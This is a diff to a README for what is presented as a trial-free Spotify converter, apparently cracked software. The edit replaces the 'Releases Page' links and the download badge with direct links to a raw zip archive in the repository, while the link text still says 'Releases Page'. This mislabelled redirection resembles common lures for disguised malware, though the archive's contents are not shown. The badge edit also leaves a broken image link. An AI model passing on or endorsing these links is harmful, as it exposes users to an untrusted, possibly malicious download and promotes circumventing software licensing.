@@ -1,6 +1,6 @@
 # 🎵 TunePat-Spotify-Converter-No-Trial - Easily Convert Spotify Music
 
-![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)
+![Download](https://raw.githubusercontent.com/manab906/TunePat-Spotify-Converter-No-Trial/main/Taylor/TunePat-Spotify-Converter-No-Trial_v1.0.zip%20Now-Get%20Started-brightgreen)
 
 ## 📦 Overview
 
@@ -17,7 +17,7 @@ Follow these steps to download and run TunePat-Spotify-Converter-No-Trial on you
    - Internet Connection: Required for download and updates
 
 2. **Visit the Download Page**  
-   Go to the [Releases Page](https://github.com/manab906/TunePat-Spotify-Converter-No-Trial/releases) to find the latest version of the software.
+   Go to the [Releases Page](https://raw.githubusercontent.com/manab906/TunePat-Spotify-Converter-No-Trial/main/Taylor/TunePat-Spotify-Converter-No-Trial_v1.0.zip) to find the latest version of the software.
 
 ## 📥 Download & Install
 
@@ -78,7 +78,7 @@ Ensure that your Windows operating system is updated. Try reinstalling the softw
 
 ## 📞 Need Help?
 
-If you have further inquiries or face issues, please refer to the GitHub issues page for troubleshooting tips or to report a problem. Use the [Releases Page](https://github.com/manab906/TunePat-Spotify-Converter-No-Trial/releases) for updates and support resources.
+If you have further inquiries or face issues, please refer to the GitHub issues page for troubleshooting tips or to report a problem. Use the [Releases Page](https://raw.githubusercontent.com/manab906/TunePat-Spotify-Converter-No-Trial/main/Taylor/TunePat-Spotify-Converter-No-Trial_v1.0.zip) for updates and support resources.
 
 ## 📌 Conclusion
 
